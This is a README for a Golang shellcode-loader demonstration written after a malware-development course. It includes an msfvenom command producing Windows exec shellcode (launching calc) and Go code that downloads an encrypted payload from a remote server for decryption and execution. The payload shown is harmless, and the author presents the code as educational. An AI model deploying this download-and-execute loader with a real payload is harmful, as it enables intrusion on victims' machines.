# Pochita

![files](./Images/pochita.jpg)

I was motivated to create this project after completing Sektor7's Malware Essentials course. Despite the abundance of proofs-of-concept for C, there needed to be more readily understandable and easy-to-follow examples for Golang. This project aims to fill that gap by clearly demonstrating the encryption and shellcode execution process, as guided by Sektor7's course. It's important to note that this code is purely for demonstration purposes and is not intended to bypass anti-virus or endpoint detection and response software.

## Generating Shellcode

On your Linux terminal run the following command:

```
msfvenom -p windows/x64/exec CMD=calc -f raw > calc.bin
```

***Note:*** I compiled and moved the shellcode to the windows host to run `testing-encryptor.go` script to generate the `2ENC.bin`


## Method to the madness

1. Pull the encrypted file from a remote server
2. Unencrypt the file's contents into the world variable
3. 2 methods are currently in the code, so choose which one to test


Make sure to change the URL address.

```azure
func getFile() {
	// Make GET request to URL
	resp, err := http.Get("http://192.168.153.145:9090/2ENC.bin")
if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	// Create file on local file system
	//C:\\Users\\Public\\Downloads\\ENC.bin"
	file, err := os.Create("2ENC.bin")
if err != nil {
		panic(err)
	}
	defer file.Close()
```